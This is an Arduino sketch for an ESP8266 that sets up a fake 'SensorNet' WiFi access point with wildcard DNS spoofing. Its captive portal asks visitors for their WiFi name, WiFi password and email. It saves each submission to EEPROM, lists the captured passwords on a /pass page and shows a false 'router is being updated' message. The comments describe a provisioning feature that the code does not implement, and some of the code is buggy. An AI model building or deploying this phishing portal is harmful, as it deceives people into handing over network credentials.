// ESP8266 WiFi Captive Portal
// By 125K (github.com/125K)

// Libraries
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Default SSID name
const char* SSID_NAME = "#Sensor ID37645 SensorNet";

// Default main strings
#define TITLE "SensorNet"
#define SUBTITLE "Configuração do Sensor"
#define BODY "Informe os dados para conectar o módulo na sua Internet e registra-lo ao seu usuário do nosso Site."
#define POST_TITLE "Atualizando..."
#define POST_BODY "Your router is being updated. Please, wait until the proccess finishes.</br>Thank you."
#define PASS_TITLE "Passwords"
#define CLEAR_TITLE "Cleared"

// Init system settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1);  // Gateway

String allPass = "";
String newSSID = "";
String currentSSID = "";

// For storing passwords in EEPROM.
int initialCheckLocation = 20;  // Location to check whether the ESP is running for the first time.
int passStart = 30;             // Starting location in EEPROM to save password.
int passEnd = passStart;        // Ending location in EEPROM to save password.


unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer() {
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t) {
  String a = String(currentSSID);
  String CSS = "div,h1{padding:.5em}body,label{color:#333}label,nav,nav b{display:block}input,textarea{width:100%}article{background:#f2f2f2;padding:1.3em}body{font-family:Century Gothic,sans-serif;font-size:18px;line-height:24px;margin:0;padding:0}h1{margin:.5em 0 0}input{padding:9px 10px;margin:8px 0;box-sizing:border-box;border-radius:10px;border:1px solid #555}label{font-style:italic;font-weight:700}nav{background:#06f;color:#fff;font-size:1.3em;padding:1em}nav b{font-size:1.5em;margin-bottom:.5em}";
  String h = "<!DOCTYPE html><html><head><title>SensorsNet.com</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>"
             + CSS + "</style>"
                     "<meta charset=\"UTF-8\"></head>"
                     "<body><nav><b>"
             + TITLE + "</b> " + SUBTITLE + "</nav><div>";
  return h;
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" + "<label>Sua Rede WiFi:</label><input type=text name=m></input>" + "<label>Senha da sua WiFi:</label><input type=password name=m></input>" + "<label>Seu eMail:</label><input type=text name=m></input><input type=submit value=Verificar>" + "</form>" + footer();
}

String posted() {
  String pass = input("m");
  pass = "<li><b>" + pass + "</li></b>";  // Adding password in a ordered list.
  allPass += pass;                        // Updating the full passwords.

  // Storing passwords to EEPROM.
  for (int i = 0; i <= pass.length(); ++i) {
    EEPROM.write(passEnd + i, pass[i]);  // Adding password to existing password in EEPROM.
  }

  passEnd += pass.length();  // Updating end position of passwords in EEPROM.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(POST_TITLE) + POST_BODY + footer();
}

String pass() {
  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String ssid() {
  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>" + "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
}

String postedSSID() {
  String postedSSID = input("s");
  newSSID = "<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i) {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID);
  return postedSSID;
}

String clear() {
  allPass = "";
  passEnd = passStart;  // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK() {  // The built-in LED will blink 5 times after a password is posted.
  for (int counter = 0; counter < 10; counter++) {
    // For blinking the LED.
    digitalWrite(BUILTIN_LED, counter % 2);
    delay(500);
  }
}

void setup() {
  // Serial begin
  Serial.begin(115200);

  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Operação:
  /*
  - Recupere o nome da rede wifi, senha e email do usuario na EEPROM (limite 4k... cabe tudo)
  - Se não existir qualquer um deles, inicie com o modo Access Point
  - Se existir, tente se conectar ao wifi. Se não conseguir, inicie o Access Point informando que não conseguiu se conectar e deixe o usuário trocar.
  - Se conseguir se conectar, conecte-se ao servidor e registre o equipamento com MAC, eMail e nome da rede.
  - O usuário pode solicitar um RESET no sensor/módulo através da conta dele. Se solicitado, limpe wifi, senha e email e ESP.restart() (boot).
  - O led deve ficar vemelho se o modo AP estiver habilitado.
  - O led deve ficar verde se conectado ao wifi
  - O led deve ficar amarelo qdo transmitindo (sem apagar o verde).
  */

  // Check whether the ESP is running for the first time.
  String checkValue = "first";  // This will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i) {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i]) {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i) {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');          // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0');  // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }
  }

  // Read EEPROM SSID
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0') {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0') {
    allPass += char(EEPROM.read(passEnd));  // Reading the store password in EEPROM.
    passEnd++;                              // Updating the end location of password in EEPROM.
  }

  WiFi.mode(WIFI_AP);                                          // WIFI_AP fixo
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));  // APIP Inicializado com 172.0.0.1

  // Setting currentSSID -> SSID in EEPROM or default one.
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("Current SSID: ");
  Serial.println(currentSSID);
  WiFi.softAP(currentSSID);



  // Start webserver
  dnsServer.start(DNS_PORT, "*", APIP);  // DNS spoofing (Only for HTTP)
  
  // Rotas do WebServer
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();
  });

  webServer.on("/ssid", []() {
    webServer.send(HTTP_CODE, "text/html", ssid());
  });
  webServer.on("/postSSID", []() {
    webServer.send(HTTP_CODE, "text/html", postedSSID());
  });
  webServer.on("/pass", []() {
    webServer.send(HTTP_CODE, "text/html", pass());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.begin();

  // Enable the built-in LED
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}


void loop() {
  if ((millis() - lastTick) > TICK_TIMER) { lastTick = millis(); }
  dnsServer.processNextRequest(); // Este cara não pode ficar ouvindo conexões para o resto da vida né?!? use dnsServer.stop
  webServer.handleClient();



}